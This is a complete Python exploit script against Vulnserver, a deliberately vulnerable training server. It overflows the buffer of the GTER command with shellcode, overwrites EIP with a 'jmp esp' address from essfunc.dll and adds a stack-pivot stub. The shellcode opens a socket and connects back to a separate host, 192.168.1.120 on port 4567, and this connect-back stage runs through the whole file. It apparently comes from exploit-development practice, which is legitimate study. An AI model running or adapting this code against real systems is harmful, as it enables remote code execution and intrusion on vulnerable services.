#!/usr/bin/python

import socket

target = "192.168.1.121"
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))

# EIP offset at 147
# 0x625011d3 : "jmp esp" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\werebug\Desktop\Vulnserver\essfunc.dll)
# WSASocketA (2, 1, 6, 0, 0, 0)
payload = "\x31\xc0\x50\x50\x50\x31\xdb\xb3\x06\x53\x40\x50\x40\x50\xbb\x69\x87\xa3\x71\x31\xc0\xff\xd3\x96"
# connect
payload += "\x68\xc0\xa8\x01\x78\x66\x68\x11\xd7\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x56\xbb\x6a\x40\xa3\x71\xff\xd3"
payload += "A" * (147 - len(payload))
payload += "\xd3\x11\x50\x62"

#nasm > mov esp,eax
#00000000  89C4              mov esp,eax
#nasm > add eax, 9
#00000000  83C009            add eax,byte +0x9
#nasm > jmp eax
#00000000  FFE0              jmp eax
payload += "\x89\xC4\x83\xC0\x09\xFF\xE0"

payload += "C" * (1000 - len(payload))

s.send("GTER /.:/" + payload + "\n")
s.close()
